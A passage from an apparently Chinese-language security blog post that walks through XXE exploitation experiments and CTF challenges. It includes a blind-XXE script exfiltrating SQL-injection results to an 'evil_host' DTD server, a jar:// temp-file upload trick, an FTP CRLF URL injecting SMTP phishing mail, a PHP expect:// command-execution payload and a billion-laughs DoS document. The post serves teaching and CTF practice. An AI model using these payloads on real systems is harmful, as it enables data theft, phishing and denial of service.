<p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入，但是因为本身这个就是一个 Blind XXE , 我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;39.107.33.75:33899&#x2F;common.php&#39;</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">        &quot;name&quot;:&quot;evil_man&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,</span><br><span class="line">        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">                &lt;!DOCTYPE root [</span><br><span class="line">                &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil_host&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">                %dtd;]&gt;</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f &#x3D; open(&#39;.&#x2F;evil.dtd&#39;,&#39;w&#39;)</span><br><span class="line">            payload2 &#x3D; &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.223.18&#x2F;test.php?shop&#x3D;3&#39;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&#39;&#123;&#125;&#39;))then(0)else(1)end)-&#39;1&quot;&gt;</span><br><span class="line">                &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;evil_host&#x2F;?result&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">                %all;</span><br><span class="line">                %send;&quot;&quot;&quot;.format(&#39;_&#39;*i+chr(j)+&#39;_&#39;*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print &#39;test &#123;&#125;&#39;.format(chr(j))</span><br><span class="line">                r &#x3D; s.post(url,data&#x3D;data)</span><br><span class="line">                if &quot;Oti3a3LeLPdkPkqKF84xs&#x3D;&quot; in r.content and chr(j)!&#x3D;&#39;_&#39;:</span><br><span class="line">                        result +&#x3D; chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure>

<p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是 0 解</p>
<h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p>
<p><strong>jar:// 协议的格式：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure>

<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure>

<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些 2016 年的 HCTF 中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018 年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在 2017 年的 hitcon 中出过这道题）</p>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
<blockquote>
<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
</blockquote>
<p>下面是我的一些测试过程：</p>
<p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p>
<p><strong>示例代码：</strong></p>
<p><strong>xml_test.java</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">package xml_test;</span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Attr;</span><br><span class="line">import org.w3c.dom.Comment;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Element;</span><br><span class="line">import org.w3c.dom.NamedNodeMap;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span><br><span class="line"> * @author zhanglong</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class xml_test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">        Document doc &#x3D; db.parse(new File(&quot;student.xml&quot;));</span><br><span class="line">        &#x2F;&#x2F;获得根元素结点</span><br><span class="line">        Element root &#x3D; doc.getDocumentElement();</span><br><span class="line"></span><br><span class="line">        parseElement(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void parseElement(Element element)</span><br><span class="line">    &#123;</span><br><span class="line">        String tagName &#x3D; element.getNodeName();</span><br><span class="line"></span><br><span class="line">        NodeList children &#x3D; element.getChildNodes();</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&quot; + tagName);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span><br><span class="line">        NamedNodeMap map &#x3D; element.getAttributes();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;如果该元素存在属性</span><br><span class="line">        if(null !&#x3D; map)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int i &#x3D; 0; i &lt; map.getLength(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;获得该元素的每一个属性</span><br><span class="line">                Attr attr &#x3D; (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName &#x3D; attr.getName();</span><br><span class="line">                String attrValue &#x3D; attr.getValue();</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot; &quot; + attrName + &quot;&#x3D;\&quot;&quot; + attrValue + &quot;\&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        for(int i &#x3D; 0; i &lt; children.getLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node &#x3D; children.item(i);</span><br><span class="line">            &#x2F;&#x2F;获得结点的类型</span><br><span class="line">            short nodeType &#x3D; node.getNodeType();</span><br><span class="line"></span><br><span class="line">            if(nodeType &#x3D;&#x3D; Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;是元素，继续递归</span><br><span class="line">                parseElement((Element)node);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;递归出口</span><br><span class="line">                System.out.print(node.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.print(&quot;&lt;!--&quot;);</span><br><span class="line"></span><br><span class="line">                Comment comment &#x3D; (Comment)node;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;注释内容</span><br><span class="line">                String data &#x3D; comment.getData();</span><br><span class="line"></span><br><span class="line">                System.out.print(data);</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot;--&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&#x2F;&quot; + tagName + &quot;&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p>
<p><strong>student.xml</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure>

<p><strong>目录结构如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" alt="img"></a></p>
<p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么 9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p>
<p><strong>示例代码：</strong></p>
<p><strong>sever.py</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import sys </span><br><span class="line">import time </span><br><span class="line">import threading </span><br><span class="line">import socketserver </span><br><span class="line">from urllib.parse import quote </span><br><span class="line">import http.client as httpc </span><br><span class="line"></span><br><span class="line">listen_host &#x3D; &#39;localhost&#39; </span><br><span class="line">listen_port &#x3D; 9999 </span><br><span class="line">jar_file &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">class JarRequestHandler(socketserver.BaseRequestHandler):  </span><br><span class="line">    def handle(self):</span><br><span class="line">        http_req &#x3D; b&#39;&#39;</span><br><span class="line">        print(&#39;New connection:&#39;,self.client_address)</span><br><span class="line">        while b&#39;\r\n\r\n&#39; not in http_req:</span><br><span class="line">            try:</span><br><span class="line">                http_req +&#x3D; self.request.recv(4096)</span><br><span class="line">                print(&#39;Client req:\r\n&#39;,http_req.decode())</span><br><span class="line">                jf &#x3D; open(jar_file, &#39;rb&#39;)</span><br><span class="line">                contents &#x3D; jf.read()</span><br><span class="line">                headers &#x3D; (&#39;&#39;&#39;HTTP&#x2F;1.0 200 OK\r\n&#39;&#39;&#39;</span><br><span class="line">                &#39;&#39;&#39;Content-Type: application&#x2F;java-archive\r\n\r\n&#39;&#39;&#39;)</span><br><span class="line">                self.request.sendall(headers.encode(&#39;ascii&#39;))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:-1])</span><br><span class="line">                time.sleep(30)</span><br><span class="line">                print(30)</span><br><span class="line">                self.request.sendall(contents[-1:])</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print (&quot;get error at:&quot;+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    jarserver &#x3D; socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    print (&#39;waiting for connection...&#39;) </span><br><span class="line">    server_thread &#x3D; threading.Thread(target&#x3D;jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon &#x3D; True </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure>

<p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep (30)，这个的目的我后面再说</p>
<p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p>
<blockquote>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
</blockquote>
<p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p>
<p><strong>如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" alt="img"></a></p>
<p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是 sleep ()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p>
<p><strong>下面是我的实验录屏：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" alt="img"></a></p>
<p>实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</p>
<p>我后来在 LCTF 2018 出了这样一个 CTF 题目，详细的 wp 可以看我的[这篇文章](<a href="http://www.k0rz3n.com/2018/11/19/LCTF" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)</p>
<h3 id="实验七：钓鱼："><a href="#实验七：钓鱼：" class="headerlink" title="实验七：钓鱼："></a><strong>实验七：钓鱼：</strong></h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自 fb 的一篇文章 ）</p>
<p>Java 支持在 sun.net.ftp.impl.FtpClient 中的 ftp URI。因此，我们可以指定用户名和密码，例如 <a href="ftp://user:password@host:port/test.txt，FTP">ftp://user:password@host:port/test.txt，FTP</a> 客户端将在连接中发送相应的 USER 命令。</p>
<p>但是如果我们将 %0D%0A (CRLF) 添加到 URL 的 user 部分的任意位置，我们就可以终止 USER 命令并向 FTP 会话中注入一个新的命令，即允许我们向 25 端口发送任意的 SMTP 命令：</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>

<p>当 FTP 客户端使用此 URL 连接时，以下命令将会被发送给 VULNERABLESYSTEM.com 上的邮件服务器：</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http:&#x2F;&#x2F;PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>

<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
<h3 id="实验八：其他："><a href="#实验八：其他：" class="headerlink" title="实验八：其他："></a><strong>实验八：其他：</strong></h3><p>除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</p>
<h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个 expect 扩展我们就能直接利用 XXE 进行 RCE</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE lolz [</span><br><span class="line">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>


















      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/11/xxe/" data-id="clmvmvoos001g1s7k4nxw6k8v" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Coppersmith/" rel="tag">Coppersmith</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GraphiQL/" rel="tag">GraphiQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rsa/" rel="tag">rsa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sage/" rel="tag">sage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unctf/" rel="tag">unctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" rel="tag">大统一场理论</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
